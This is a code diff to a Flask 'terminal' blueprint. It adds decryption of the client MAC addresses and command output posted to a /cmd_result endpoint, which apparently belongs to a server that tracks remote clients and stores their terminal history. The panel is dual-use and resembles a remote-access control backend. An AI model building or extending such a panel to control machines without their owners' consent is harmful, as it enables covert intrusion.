@@ -1,7 +1,7 @@
 from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
 from datetime import datetime
 import os, time, json, threading
-from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE
+from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data
 
 bp = Blueprint('terminal', __name__)
 
@@ -103,8 +103,8 @@ def terminal_page(mac):
 
 @bp.route('/cmd_result', methods=['POST'])
 def cmd_result():
-    mac = request.form.get('mac')
-    output = request.form.get('output')
+    mac = decrypt_data(request.form.get('mac', ''))
+    output = decrypt_data(request.form.get('output', ''))
     if mac in clients_db:
         # 将最新的结果自动往后追加到这段历史记录里，并且截断过长的历史以节省空间
         clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"{output}\n")[-50000:];
